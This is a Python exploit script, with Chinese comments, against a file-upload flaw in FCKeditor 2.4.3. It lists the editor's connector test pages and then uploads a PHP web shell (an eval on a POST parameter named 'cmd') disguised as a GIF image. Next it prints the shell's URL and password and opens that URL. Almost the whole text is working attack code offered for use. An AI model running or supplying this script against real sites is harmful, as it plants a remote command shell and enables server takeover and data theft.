"""
fckeditor 2.4.3 漏洞
http://localhost/fckeditor/editor/filemanager/connectors/test.html
http://localhost/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector
http://localhost/fckeditor/editor/filemanager/upload/test.html
http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html
http://localhost/fckeditor/editor/filemanager/connectors/uploadtest.html
"""
import requests

domain = "http://localhost"
host = "%s/fckeditor" % domain
file = 'shellxx.php'
shell_url = f'{domain}/userfiles/file/{file}'
burp0_url = "%s/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/" % host
burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": domain,
                 "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryiV32pXYAhBXcSyTC", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "iframe",
                 "Referer": f"{domain}/fckeditor/editor/filemanager/browser/default/connectors/test.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp0_data = f"------WebKitFormBoundaryiV32pXYAhBXcSyTC\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"{file} \"\r\nContent-Type: image/gif\r\n\r\nGIF89a<?php @eval($_POST['cmd']) ?>\r\n------WebKitFormBoundaryiV32pXYAhBXcSyTC--\r\n"
res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(res.content)
print('点击 Get Folders and Files 看看文件有没有, 没有就改一下文件名再访问吧, 同名上传时不会覆盖，会加(1)(2)')
print('连接shell, pwd: cmd')
print(shell_url)

import os
os.system(f'start {shell_url}')
